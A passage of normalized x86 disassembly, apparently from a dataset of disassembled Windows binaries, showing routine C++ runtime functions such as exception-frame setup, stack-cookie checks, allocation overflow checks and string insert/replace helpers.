mov ecx [ ebp - 0x4 ]
call sub_413120
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_417140
mov esp ebp
pop ebp
retn 0x8
sub_416940
push ebp
mov ebp esp
push 0xffffffff
push sub_43bdf8
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp - 0x10 ]
call sub_401790
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
push ecx
call sub_402180
add esp 0x4
mov edx [ ebp - 0x10 ]
mov eax [ eax ]
mov [ edx + 0x18 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
sub_4169c0
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp - 0x4 ]
call sub_417ef0
push 0x0
lea ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_417200
mov edx [ eax ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_417220
push eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_417f30
push eax
mov ecx [ ebp + 0x8 ]
call sub_418210
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x8
sub_416a20
push ebp
mov ebp esp
push 0xffffffff
push sub_43b1b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_42168a
mov [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
mov [ ebp - 0x18 ] eax
mov ecx rw-data
call sub_40cf90
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x24 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_40d1c0
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
push ecx
call sub_417260
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x1c ] edx
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_4216e6
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x18 ]
mov [ rw-data ] ecx
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
mov ecx [ ebp - 0x20 ]
mov eax [ edx + 0x4 ]
call eax
mov ecx [ ebp - 0x20 ]
push ecx
call sub_42181e
add esp 0x4
push r--data
lea ecx [ ebp - 0x34 ]
call sub_423912
push r--data
lea edx [ ebp - 0x34 ]
push edx
call sub_42569b
jmp r-xdata
sub_416b30
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_418260
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_416b50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_418280
add esp 0xc
mov esp ebp
pop ebp
retn 0x8
sub_416b80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_4182a0
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_416ba0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4182c0
add esp 0x8
mov [ ebp - 0x1 ] al
movzx edx [ ebp - 0x1 ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4182d0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_416be0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4182c0
add esp 0x8
mov [ ebp - 0x1 ] al
movzx edx [ ebp - 0x1 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_418310
add esp 0x4
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_418320
add esp 0x14
mov esp ebp
pop ebp
retn
sub_416c30
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4182c0
add esp 0x8
mov [ ebp - 0x1 ] al
movzx edx [ ebp - 0x1 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_401010
add esp 0x10
mov esp ebp
pop ebp
retn
sub_416c70
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_410260
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_416ca0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4182c0
add esp 0x8
mov [ ebp - 0x1 ] al
movzx edx [ ebp - 0x1 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_418350
add esp 0x10
mov esp ebp
pop ebp
retn
sub_416ce0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0xaaaaaaa
ja r-xdata
jmp r-xdata
call sub_4215c5
mov eax [ ebp + 0x8 ]
imul eax eax 0x18
push eax
call sub_42257f
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_416d20
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_418380
add esp 0xc
mov esp ebp
pop ebp
retn 0x8
sub_416d50
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4182c0
add esp 0x8
mov [ ebp - 0x1 ] al
movzx edx [ ebp - 0x1 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4183a0
add esp 0x10
mov esp ebp
pop ebp
retn
sub_416d90
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x3fffffff
ja r-xdata
jmp r-xdata
call sub_4215c5
mov eax [ ebp + 0x8 ]
shl eax 0x2
push eax
call sub_42257f
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_416dd0
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ecx
lea eax [ ebp - 0x5 ]
push eax
mov ecx [ ebp - 0xc ]
call sub_4151c0
lea ecx [ ebp - 0x5 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4183e0
add esp 0x10
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0xc
sub_416e20
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_402180
add esp 0x4
push eax
mov edx [ ebp + 0x8 ]
push edx
call sub_402180
add esp 0x4
push eax
call sub_418430
add esp 0xc
pop ebp
retn
sub_416e50
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4182c0
add esp 0x8
mov [ ebp - 0x1 ] al
movzx edx [ ebp - 0x1 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_418460
add esp 0x10
mov esp ebp
pop ebp
retn
sub_416e90
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x1fffffff
ja r-xdata
jmp r-xdata
call sub_4215c5
mov eax [ ebp + 0x8 ]
shl eax 0x3
push eax
call sub_42257f
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_416ed0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4182c0
add esp 0x8
mov [ ebp - 0x1 ] al
movzx edx [ ebp - 0x1 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_418310
add esp 0x4
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_418490
add esp 0x18
mov esp ebp
pop ebp
retn
sub_416f20
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x71c71c7
ja r-xdata
jmp r-xdata
call sub_4215c5
mov eax [ ebp + 0x8 ]
imul eax eax 0x24
push eax
call sub_42257f
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_416f90
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_414e10
mov esp ebp
pop ebp
retn 0x4
sub_416fb0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0xffffffff
push 0x0
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_417350
mov esp ebp
pop ebp
retn 0x8
sub_416fe0
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x4 ] ecx
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_415cb0
movzx ecx al
test ecx ecx
je r-xdata
lea edx [ ebp - 0x14 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_4123e0
mov eax [ eax ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp + 0x10 ]
push ecx
lea ecx [ ebp + 0x14 ]
call sub_417800
push eax
lea ecx [ ebp + 0x10 ]
call sub_413dd0
push eax
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_415770
add esp 0x8
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_415770
add esp 0x8
push eax
mov ecx [ ebp - 0x4 ]
call sub_417490
lea edx [ ebp - 0x10 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_4123e0
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_415770
add esp 0x8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_415770
add esp 0x8
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ba0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x10
sub_4170a0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
ja r-xdata
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x14 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x8 ] edx
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401c70
movzx ecx al
test ecx ecx
je r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401c30
sub_417110
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov ecx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
call eax
mov esp ebp
pop ebp
retn 0xc
sub_417140
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x4 ] ecx
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_415cb0
movzx ecx al
test ecx ecx
je r-xdata
lea edx [ ebp - 0x14 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_413120
mov eax [ eax ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp + 0x10 ]
push ecx
lea ecx [ ebp + 0x14 ]
call sub_417830
push eax
lea ecx [ ebp + 0x10 ]
call sub_413dd0
push eax
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_4157a0
add esp 0x8
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4157a0
add esp 0x8
push eax
mov ecx [ ebp - 0x4 ]
call sub_417600
lea edx [ ebp - 0x10 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_413120
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_4157a0
add esp 0x8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4157a0
add esp 0x8
push eax
mov ecx [ ebp - 0x4 ]
call sub_40be00
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x10
sub_417220
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_417790
mov ecx eax
call sub_414d40
mov esp ebp
pop ebp
retn
sub_417260
push ebp
mov ebp esp
push 0xffffffff
push sub_43b9e4
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
push 0x8
call sub_42257f
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov [ ebp - 0x18 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_40d180
push eax
lea ecx [ ebp - 0x58 ]
call sub_40cd70
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0x10 ]
or edx 0x1
mov [ ebp - 0x10 ] edx
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x14 ]
call sub_417860
mov [ ebp - 0x18 ] eax
jmp r-xdata
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x58 ]
call sub_40ce50
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x4 ] 0x2
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x24 ]
mov [ edx ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
and ecx 0x1
je r-xdata
sub_417350
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
call sub_401d20
mov ecx [ ebp + 0xc ]
call sub_401890
cmp eax [ ebp + 0x10 ]
jae r-xdata
mov ecx [ ebp + 0xc ]
call sub_401890
sub eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
cmp edx [ ebp + 0x14 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
or edx 0xffffffff
sub edx [ ecx + 0x10 ]
cmp edx [ ebp + 0x14 ]
ja r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x14 ] eax
cmp [ ebp + 0x14 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x4 ]
call sub_402040
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
add ecx [ ebp + 0x14 ]
mov [ ebp - 0x8 ] ecx
push 0x0
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401c70
movzx eax al
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
add eax [ ebp + 0x14 ]
push eax
call sub_4010a0
add esp 0xc
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0xc ]
jne r-xdata
mov edx [ ebp + 0x14 ]
push edx
mov ecx [ ebp + 0xc ]
call sub_401ab0
add eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
push eax
call sub_401070
add esp 0xc
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x14 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401c30
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
push eax
call sub_4010a0
add esp 0xc
jmp r-xdata
sub_417490
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_402000
movzx ecx al
test ecx ecx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp + 0x14 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
mov ecx [ ebp + 0x10 ]
sub ecx eax
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_4178d0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp + 0x8 ]
cmp edx [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_401d20
mov esp ebp
pop ebp
retn 0x10
or edx 0xffffffff
sub edx [ ebp + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
sub ecx [ ebp + 0xc ]
cmp edx ecx
ja r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
sub ecx [ ebp + 0x8 ]
mov [ ebp + 0xc ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
sub eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x14 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_402040
cmp [ ebp + 0x14 ] 0x0
ja r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
add eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
add eax [ ebp + 0x14 ]
push eax
call sub_4010a0
add esp 0xc
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
add ecx [ ebp + 0x14 ]
sub ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
push 0x0
mov edx [ ebp - 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401c70
movzx eax al
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
push eax
call sub_401070
add esp 0xc
mov edx [ ebp - 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401c30
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
add eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
add eax [ ebp + 0x14 ]
push eax
call sub_4010a0
add esp 0xc
sub_417600
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c2f0
movzx ecx al
test ecx ecx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp + 0x14 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x10 ]
sub ecx eax
sar ecx 0x1
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_417b90
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp + 0x8 ]
cmp edx [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_401d20
mov esp ebp
pop ebp
retn 0x10
or edx 0xffffffff
sub edx [ ebp + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
sub ecx [ ebp + 0xc ]
cmp edx ecx
ja r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
sub ecx [ ebp + 0x8 ]
mov [ ebp + 0xc ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
sub eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x14 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_402040
cmp [ ebp + 0x14 ] 0x0
ja r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0xc ]
lea ecx [ edx + eax * 2 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
mov ecx [ ebp + 0x14 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40bd00
add esp 0xc
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
add ecx [ ebp + 0x14 ]
sub ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
push 0x0
mov edx [ ebp - 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c240
movzx eax al
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
push eax
call sub_40bc90
add esp 0xc
mov ecx [ ebp - 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40bff0
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0xc ]
lea ecx [ edx + eax * 2 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
mov ecx [ ebp + 0x14 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40bd00
add esp 0xc
sub_417790
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
push edx
call sub_402180
add esp 0x4
mov eax [ eax ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_414d20
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_4177c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
push edx
call sub_402180
add esp 0x4
mov eax [ eax ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_415320
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_417800
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x8 ]
call sub_415fc0
mov esp ebp
pop ebp
retn 0x4
sub_417830
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x8 ]
call sub_415ff0
mov esp ebp
pop ebp
retn 0x4
sub_417860
push ebp
mov ebp esp
push 0xffffffff
push sub_43b3c8
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x10 ]
call sub_40d2a0
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x10 ]
mov [ ecx ] r--data
mov edx [ ebp + 0x8 ]
push edx
